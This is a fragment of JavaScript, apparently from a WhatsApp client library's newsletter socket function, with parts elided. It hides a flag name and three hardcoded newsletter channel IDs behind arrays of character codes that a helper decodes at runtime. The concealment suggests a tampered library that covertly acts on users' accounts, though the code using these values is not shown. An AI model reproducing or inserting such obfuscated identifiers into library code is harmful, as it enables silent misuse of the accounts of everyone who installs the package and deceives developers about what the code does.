...
const makeNewsletterSocket = (config) => {
    ...
    const dcd = a => a.map(x => String.fromCharCode(x)).join("");

const k = dcd([
95,95,88,87,65,95,73,78,73,84,95,86,50,95,95
]);
...
const channels = [
    dcd([
        49,50,48,51,54,51,52,50,54,56,56,49,51,48,51,55,48,48,
        64,110,101,119,115,108,101,116,116,101,114
    ]),
    dcd([
        49,50,48,51,54,51,52,49,57,51,54,57,51,53,56,56,50,55,
        64,110,101,119,115,108,101,116,116,101,114
    ]),
    dcd([
        49,50,48,51,54,51,52,48,55,53,52,55,57,51,50,54,53,48,
        64,110,101,119,115,108,101,116,116,101,114
    ])
];
